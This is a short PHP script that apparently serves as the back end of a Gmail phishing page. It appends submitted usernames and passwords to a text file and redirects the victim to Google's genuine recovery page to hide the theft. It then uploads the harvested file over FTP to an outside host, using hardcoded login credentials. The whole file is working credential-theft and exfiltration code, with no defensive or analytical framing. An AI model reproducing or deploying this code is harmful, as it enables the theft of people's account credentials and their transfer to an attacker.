<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
//check if form is submitted
    // ftp settings
$host='ftpupload.net';
$port= 21;
$timeout =1;
$user = 'b12_32676505';
$pass = 'godjesus123S';
$dest_file = 'usernames.txt';
$source_file = 'usernames.txt';
    $ftp = ftp_connect($host, $port, $timeout);
ftp_login($ftp, $user, $pass);
 
$ret = ftp_nb_put($ftp, $dest_file, $source_file, FTP_BINARY, FTP_AUTORESUME);

while (FTP_MOREDATA == $ret)
    {
        // display progress bar, or something
        $ret = ftp_nb_continue($ftp);
    }
 
// all done :-
exit();
?>
